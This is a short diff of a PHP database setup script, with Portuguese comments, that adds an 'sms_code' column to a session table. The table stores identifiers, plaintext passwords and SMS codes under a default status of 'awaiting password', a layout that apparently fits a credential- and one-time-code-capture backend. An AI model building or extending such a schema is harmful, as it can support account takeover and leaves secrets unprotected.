@@ -5,13 +5,8 @@
 $dbUrl = getenv('DATABASE_URL');
 
 if (empty($dbUrl)) {
-    // Para testes locais, você pode descomentar a linha abaixo e adicionar suas credenciais.
-    // $dbUrl = "postgres://user:pass@host:port/dbname";
-    
-    // Se ainda estiver vazio, encerra a execução.
-    if (empty($dbUrl)) {
-        die(json_encode(['success' => false, 'error' => 'DATABASE_URL não configurada.']));
-    }
+    // Se a variável de ambiente não estiver configurada, encerra a execução.
+    die(json_encode(['success' => false, 'error' => 'DATABASE_URL não configurada.']));
 }
 
 $dbopts = parse_url($dbUrl);
@@ -35,7 +30,8 @@ try {
         session_id VARCHAR(255) NOT NULL,
         identificador VARCHAR(255) NOT NULL,
         senha VARCHAR(255) NULL,
-        qrcode_path VARCHAR(255) NULL, -- ADICIONADO --
+        sms_code VARCHAR(255) NULL, -- <<< COLUNA ADICIONADA AQUI
+        qrcode_path VARCHAR(255) NULL,
         status VARCHAR(50) DEFAULT 'aguardando_senha',
         data_criacao TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
     );
